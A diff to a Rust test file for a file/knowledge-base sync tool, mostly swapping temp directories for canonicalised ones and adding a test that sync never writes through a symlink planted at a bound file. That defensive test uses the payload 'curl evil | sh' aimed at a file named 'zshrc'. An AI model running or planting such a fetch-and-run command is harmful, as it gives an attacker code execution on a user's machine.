@@ -15,6 +15,14 @@ use jkb_sync::{sync, sync_paths, Outcome};
 use jkb_types::{ConflictPolicy, SyncMode};
 use rusqlite::OptionalExtension;
 
+/// A temporary directory at its canonical path. `jkb mount create` stores a mount's directory
+/// canonical and sync refuses a path through a symlink (`jkb_core::nofollow`), so a test mounting a
+/// raw temp path — `/var/folders/…` on macOS, where `/var` is a link — would be refused for a reason
+/// real mounts never meet.
+fn real_tempdir() -> tempfile::TempDir {
+    tempfile::tempdir_in(std::fs::canonicalize(std::env::temp_dir()).unwrap()).unwrap()
+}
+
 /// Create a `file://` mount at `ns_path` backing `dir`.
 #[allow(clippy::too_many_arguments)]
 fn mount_dir(
@@ -96,7 +104,7 @@ fn kb_edit(db: &Db, uri: &str, content: &str) {
 
 #[test]
 fn readme_imports_then_round_trips_both_ways() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("README.md");
     fs::write(&file, "hello").unwrap();
     let uri = uri_for(&file);
@@ -141,7 +149,7 @@ fn readme_imports_then_round_trips_both_ways() {
 
 #[test]
 fn excluded_files_are_not_synced() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     fs::write(dir.path().join("keep.md"), "keep me").unwrap();
     fs::write(dir.path().join("secret.env"), "nope").unwrap();
 
@@ -165,7 +173,7 @@ fn excluded_files_are_not_synced() {
 
 #[test]
 fn both_changed_conflict_is_reported_under_manual() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("README.md");
     fs::write(&file, "base").unwrap();
     let uri = uri_for(&file);
@@ -196,7 +204,7 @@ fn both_changed_conflict_is_reported_under_manual() {
 
 #[test]
 fn both_changed_disk_wins_imports_the_disk_copy() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("README.md");
     fs::write(&file, "base").unwrap();
     let uri = uri_for(&file);
@@ -227,7 +235,7 @@ fn both_changed_disk_wins_imports_the_disk_copy() {
 
 #[test]
 fn failed_import_does_not_corrupt_sync_state() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("README.md");
     fs::write(&file, "valid text").unwrap();
     let uri = uri_for(&file);
@@ -271,7 +279,7 @@ fn failed_import_does_not_corrupt_sync_state() {
 
 #[test]
 fn unknown_serializer_is_rejected() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     fs::write(dir.path().join("a.md"), "x").unwrap();
 
     let db = Db::open_in_memory().unwrap();
@@ -292,7 +300,7 @@ fn unknown_serializer_is_rejected() {
 
 #[test]
 fn sync_paths_reconciles_only_the_named_files() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let a = dir.path().join("a.md");
     let b = dir.path().join("b.md");
     fs::write(&a, "a1").unwrap();
@@ -324,7 +332,7 @@ fn sync_paths_reconciles_only_the_named_files() {
 
 #[test]
 fn sync_paths_drops_paths_outside_scope() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let keep = dir.path().join("keep.md");
     fs::write(&keep, "keep").unwrap();
     fs::write(dir.path().join("skip.env"), "skip").unwrap();
@@ -357,7 +365,7 @@ fn sync_paths_drops_paths_outside_scope() {
 
 #[test]
 fn watch_runs_an_initial_reconcile_then_stops() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("README.md");
     fs::write(&file, "watch me").unwrap();
 
@@ -387,8 +395,8 @@ fn watch_runs_an_initial_reconcile_then_stops() {
 #[test]
 fn watch_all_reconciles_every_mount_then_stops() {
     let db = Db::open_in_memory().unwrap();
-    let repo_a = tempfile::tempdir().unwrap();
-    let repo_b = tempfile::tempdir().unwrap();
+    let repo_a = real_tempdir();
+    let repo_b = real_tempdir();
     fs::write(repo_a.path().join("a.md"), "alpha").unwrap();
     fs::write(repo_b.path().join("b.md"), "beta").unwrap();
 
@@ -500,7 +508,7 @@ fn mount_tasks(db: &Db, dir: &Path, policy: ConflictPolicy) {
 
 #[test]
 fn tasks_import_creates_items_sections_and_is_byte_stable() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -555,7 +563,7 @@ fn is_blocked(db: &Db, uid: &str) -> bool {
 
 #[test]
 fn kb_edit_exports_and_preserves_structure() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -579,7 +587,7 @@ fn kb_edit_exports_and_preserves_structure() {
 
 #[test]
 fn caret_less_task_is_stamped_back_to_disk() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, "- [ ] a fresh task\n").unwrap();
 
@@ -596,7 +604,7 @@ fn caret_less_task_is_stamped_back_to_disk() {
 
 #[test]
 fn removing_a_task_line_cancels_the_item() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -623,7 +631,7 @@ fn removing_a_task_line_cancels_the_item() {
 
 #[test]
 fn disjoint_disk_and_kb_edits_merge_three_way() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -656,7 +664,7 @@ fn disjoint_disk_and_kb_edits_merge_three_way() {
 
 #[test]
 fn same_task_edited_both_sides_conflicts_under_manual() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -688,7 +696,7 @@ fn same_task_edited_both_sides_conflicts_under_manual() {
 
 #[test]
 fn malformed_file_is_quarantined_then_recovers() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -742,7 +750,7 @@ fn disk_reindent_survives_a_three_way_merge() {
     // Regression: a re-parenting (indentation) edit on disk is a `parent_of` change, which
     // the merge signature must capture — otherwise a both-sides-changed merge silently
     // reverts it (the child's `Sig` looks identical and the edge is taken from `base`).
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -803,7 +811,7 @@ fn disk_reindent_survives_a_three_way_merge() {
 /// stale header was written back over it.
 #[test]
 fn prose_is_not_an_item_so_a_section_cannot_outlive_the_file() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(
         &file,
@@ -876,7 +884,7 @@ fn prose_is_not_an_item_so_a_section_cannot_outlive_the_file() {
 /// so a plain insert hit `UNIQUE constraint failed: items.uid` and the whole sync errored.
 #[test]
 fn re_adding_a_deleted_task_line_reattaches_the_same_item() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(
         &file,
@@ -932,7 +940,7 @@ fn id_of(db: &Db, uid: &str) -> i64 {
 /// and paragraph out of a merged file (it destroyed a real openspec document).
 #[test]
 fn a_three_way_merge_keeps_the_files_prose() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(
         &file,
@@ -1025,7 +1033,7 @@ fn headers_mid_item(text: &str) -> Vec<&str> {
 /// three-way merge.
 #[test]
 fn document_order_survives_kb_side_changes_and_merges() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     let source = "# Plan\n\nIntro prose.\n\n## Alpha\n\n- [ ] first ^first\n  the first body\n  a second body line\n- [ ] second ^second\n\n## Beta\n\nSection prose.\n\n- [ ] third ^third\n  the third body\n";
     fs::write(&file, source).unwrap();
@@ -1140,7 +1148,7 @@ fn document_order_survives_kb_side_changes_and_merges() {
 /// wrote (non-canonical for today's), while the KB's content is untouched.
 #[test]
 fn a_renderer_change_is_not_mistaken_for_a_content_change() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     // The renderer emits modifiers in a canonical order (priority, due, tags, ...), so the
     // same document written with them in another order is byte-different but identical in
@@ -1225,7 +1233,7 @@ fn a_renderer_change_is_not_mistaken_for_a_content_change() {
 /// every future sync. The document must be unchanged — only its formatting.
 #[test]
 fn a_non_canonical_file_is_normalized_once_then_fast_paths() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     // Canonical modifier order is priority, due, tags. Written the other way round, this is
     // the same document rendered differently.
@@ -1304,7 +1312,7 @@ fn a_non_canonical_file_is_normalized_once_then_fast_paths() {
 /// Giving each file its own namespace means there is nothing to answer.
 #[test]
 fn two_tasks_files_in_one_directory_each_keep_their_own_document() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     let design = dir.path().join("design.md");
     fs::write(&tasks, "## Plan\n\n- [ ] ship it !p1\n").unwrap();
@@ -1352,7 +1360,7 @@ fn two_tasks_files_in_one_directory_each_keep_their_own_document() {
 /// a guard, and is asserted directly so a future change to `namespace_for` fails here.
 #[test]
 fn deleting_a_sibling_never_overwrites_the_survivor() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     let design = dir.path().join("design.md");
     fs::write(&tasks, "## Plan\n\n- [ ] ship it !p1\n").unwrap();
@@ -1381,7 +1389,7 @@ fn deleting_a_sibling_never_overwrites_the_survivor() {
 /// once from the file's own base blob, and the run after that is an ordinary no-op (D45.6).
 #[test]
 fn a_legacy_journal_row_is_populated_once_from_its_own_base() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Plan\n\nSome prose.\n\n- [ ] ship it !p1\n").unwrap();
 
@@ -1427,7 +1435,7 @@ fn a_legacy_journal_row_is_populated_once_from_its_own_base() {
 /// now lives on the journal row, keyed by the file's uri, so the namespace tree cannot reach it.
 #[test]
 fn renaming_a_files_namespace_does_not_strip_the_file() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(
         &tasks,
@@ -1461,7 +1469,7 @@ fn renaming_a_files_namespace_does_not_strip_the_file() {
 /// writes that render over the file — so `jkb undo` after a re-home silently deletes task lines.
 #[test]
 fn an_export_refuses_when_a_bound_items_line_would_vanish() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Plan\n\n- [ ] keep me !p1\n- [ ] and me !p2\n").unwrap();
 
@@ -1512,7 +1520,7 @@ fn an_export_refuses_when_a_bound_items_line_would_vanish() {
 /// A legitimate KB-only edit still exports — the guard must not block the ordinary path.
 #[test]
 fn a_kb_only_status_change_still_exports() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Plan\n\n- [ ] ship it !p1\n").unwrap();
 
@@ -1547,7 +1555,7 @@ fn a_kb_only_status_change_still_exports() {
 /// bug in this subsystem grew out of.
 #[test]
 fn undoing_a_sync_rewinds_structure_with_the_hashes() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## One\n\n- [ ] first !p1\n").unwrap();
 
@@ -1592,7 +1600,7 @@ fn undoing_a_sync_rewinds_structure_with_the_hashes() {
 /// property does NOT cover (D45.4), so it is asserted on bytes rather than assumed.
 #[test]
 fn kb_wins_over_a_structurally_changed_disk_keeps_the_items() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Plan\n\n- [ ] shared !p1\n").unwrap();
 
@@ -1635,7 +1643,7 @@ fn kb_wins_over_a_structurally_changed_disk_keeps_the_items() {
 /// `write_file` dropped its line. The tool's instructions were the exploit.
 #[test]
 fn editing_a_refused_file_does_not_delete_the_protected_line() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Plan\n\n- [ ] keep me !p1\n- [ ] and me !p2\n").unwrap();
 
@@ -1726,7 +1734,7 @@ fn editing_a_refused_file_does_not_delete_the_protected_line() {
 /// re-keying it from `header_line` to `sync_section` risked.
 #[test]
 fn a_section_the_file_drops_stops_being_a_section() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Keep\n\n- [ ] a !p1\n\n## Drop\n\n- [ ] b !p2\n").unwrap();
 
@@ -1769,7 +1777,7 @@ fn a_section_the_file_drops_stops_being_a_section() {
 /// own committed transaction, before anything can write.
 #[test]
 fn what_a_sync_overwrites_is_recoverable_from_the_archive() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Plan\n\n- [ ] first !p1\n").unwrap();
 
@@ -1815,7 +1823,7 @@ fn what_a_sync_overwrites_is_recoverable_from_the_archive() {
 fn a_file_whose_bytes_cannot_be_archived_is_not_overwritten() {
     use std::os::unix::fs::PermissionsExt;
 
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let tasks = dir.path().join("tasks.md");
     fs::write(&tasks, "## Plan\n\n- [ ] ship it !p1\n").unwrap();
 
@@ -1866,7 +1874,7 @@ fn a_file_whose_bytes_cannot_be_archived_is_not_overwritten() {
 /// something false about why.
 #[test]
 fn an_export_only_mount_overwrites_a_file_it_has_never_imported() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("note.md");
     fs::write(&file, "stale bytes on disk").unwrap();
     let uri = uri_for(&file);
@@ -1950,7 +1958,7 @@ fn kb_status(db: &Db, uid: &str) -> Option<String> {
 /// mount's whole contract is that the KB is authoritative and the file is an output.
 #[test]
 fn an_export_only_mount_never_cancels_a_task_a_disk_edit_removed() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -2013,7 +2021,7 @@ fn an_export_only_mount_never_cancels_a_task_a_disk_edit_removed() {
 /// arm, and writes an item-less render over the file. Undo is supposed to give work back.
 #[test]
 fn undoing_a_sync_then_re_syncing_does_not_strip_the_file() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
 
@@ -2107,7 +2115,7 @@ fn mount_mode(db: &Db, dir: &Path, mode: SyncMode) {
 
 /// Drive one cell and return what the file looked like before and after the sync under test.
 fn matrix_case(mode: SyncMode, stage: Stage) -> (jkb_sync::SyncReport, String, String, i64) {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
     let uri = uri_for(&file);
@@ -2289,7 +2297,7 @@ fn an_export_only_mount_refuses_to_export_an_emptied_kb_over_a_populated_file() 
 #[test]
 fn a_document_mount_recovers_an_emptied_kb_and_refuses_when_it_cannot() {
     for mode in [SyncMode::Bidirectional, SyncMode::Export] {
-        let dir = tempfile::tempdir().unwrap();
+        let dir = real_tempdir();
         let file = dir.path().join("README.md");
         fs::write(&file, "the good copy\n").unwrap();
         let uri = uri_for(&file);
@@ -2361,7 +2369,7 @@ fn a_document_mount_recovers_an_emptied_kb_and_refuses_when_it_cannot() {
 /// `kb_wins` silently not honoured and has to guess whether that was meant.
 #[test]
 fn wholesale_loss_recovers_even_under_kb_wins() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_MD).unwrap();
 
@@ -2423,7 +2431,7 @@ fn wholesale_loss_recovers_even_under_kb_wins() {
 #[test]
 fn a_bound_item_that_lost_its_placement_is_refused_not_re_imported() {
     for mode in [SyncMode::Bidirectional, SyncMode::Import, SyncMode::Export] {
-        let dir = tempfile::tempdir().unwrap();
+        let dir = real_tempdir();
         let file = dir.path().join("README.md");
         fs::write(&file, "on disk\n").unwrap();
         let uri = uri_for(&file);
@@ -2534,7 +2542,7 @@ const TASKS_WITH_BASE: &str = "\
 /// document still treats the facet specially.
 #[test]
 fn a_cut_point_modifier_in_a_file_is_an_ordinary_tag_and_the_file_settles() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_WITH_BASE).unwrap();
     let uri = uri_for(&file);
@@ -2577,7 +2585,7 @@ fn a_cut_point_modifier_in_a_file_is_an_ordinary_tag_and_the_file_settles() {
 /// the facet has to come through it.
 #[test]
 fn editing_a_line_that_carries_a_cut_point_modifier_keeps_it() {
-    let dir = tempfile::tempdir().unwrap();
+    let dir = real_tempdir();
     let file = dir.path().join("tasks.md");
     fs::write(&file, TASKS_WITH_BASE).unwrap();
     let uri = uri_for(&file);
@@ -2603,5 +2611,48 @@ fn editing_a_line_that_carries_a_cut_point_modifier_keeps_it() {
             .iter()
             .any(|(f, _)| f == "base"),
         "the modifier was dropped by the reconcile"
+    );
+}
+
+/// A bound file replaced by a symlink — which a dev container can plant inside a directory it binds —
+/// is neither read through nor written through, however the knowledge base has changed: the file the
+/// link points at is left exactly as it was (`jkb_core::nofollow`).
+#[cfg(unix)]
+#[test]
+fn sync_never_writes_through_a_symlink_planted_at_a_bound_file() {
+    let dir = real_tempdir();
+    let outside = real_tempdir();
+    let file = dir.path().join("tasks.md");
+    fs::write(&file, TASKS_MD).unwrap();
+    let uri = uri_for(&file);
+    let db = Db::open_in_memory().unwrap();
+    mount_tasks(&db, dir.path(), ConflictPolicy::Manual);
+    sync(&db, "docs/plan").unwrap();
+
+    // The knowledge base changes the task — as a container's `task.edit` through `jkb serve` would.
+    let fix = format!("{uri}#fix");
+    db.write_txn("t", move |conn, meta| {
+        let id = item::id_for_uid(conn, &fix)?.expect("task");
+        item::set_content(conn, meta, id, "curl evil | sh", None)
+    })
+    .unwrap();
+    // And the bound file is swapped for a link to a file outside the mount.
+    let target = outside.path().join("zshrc");
+    fs::write(&target, TASKS_MD).unwrap();
+    fs::remove_file(&file).unwrap();
+    std::os::unix::fs::symlink(&target, &file).unwrap();
+
+    let _ = sync(&db, "docs/plan");
+    assert_eq!(
+        fs::read_to_string(&target).unwrap(),
+        TASKS_MD,
+        "the link's target was not written"
+    );
+    assert!(
+        fs::symlink_metadata(&file)
+            .unwrap()
+            .file_type()
+            .is_symlink(),
+        "and the link was not replaced by a render either"
     );
 }
